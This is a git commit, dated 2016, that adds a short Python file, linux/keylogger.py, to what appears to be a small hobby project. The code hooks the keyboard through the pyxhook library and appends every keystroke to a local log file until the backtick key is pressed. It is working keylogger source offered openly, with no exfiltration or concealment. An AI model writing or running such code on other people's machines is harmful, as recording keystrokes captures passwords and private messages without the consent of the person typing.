717ec628820432350ce3957a8daca4a18a57055c
Giacomo Lawrance <GiacomoLaw@users.noreply.github.com>
2016-11-30 09:41:11 +0000

    put in the 'meat' of the logger

--- linux/keylogger.py
+++ linux/keylogger.py
@@ -1,1 +1,30 @@
+import pyxhook
 
+#this tells the keylogger where the log will go. Change it to direct to where you want it.
+
+log_file='/home/giacomo/Desktop/file.log'
+
+
+def OnKeyPress(event):
+
+  fob=open(log_file,'a')
+
+  fob.write(event.Key)
+
+  fob.write('\n')
+
+
+
+  if event.Ascii==96: 
+
+    fob.close()
+
+    new_hook.cancel()
+
+new_hook=pyxhook.HookManager()
+
+new_hook.KeyDown=OnKeyPress
+
+new_hook.HookKeyboard()
+
+new_hook.start()
